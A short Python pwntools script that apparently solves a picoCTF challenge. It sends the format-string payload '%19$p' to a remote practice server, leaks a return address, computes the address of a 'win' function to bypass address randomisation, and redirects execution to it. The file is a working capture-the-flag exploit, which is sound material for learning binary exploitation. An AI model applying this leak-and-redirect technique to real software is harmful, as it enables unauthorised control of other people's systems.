from inspect import stack
from pwn import *

# io = process("/home/tristan/Downloads/vuln")
io = remote("rescued-float.picoctf.net", 50864)

io.recvuntil(b":")
io.sendline(b"%19$p")

# offset between return address and start of main
ret_offset_in_main = 65

# offsets found using gdb or objdump
main_offset = 0x1400
win_offset = 0x136a

data = io.recvline()
ret_addr = int(data.decode().strip(), base=16)
win_addr = ret_addr - ret_offset_in_main - main_offset + win_offset

io.recv()
io.sendline(hex(win_addr).encode())

io.interactive()

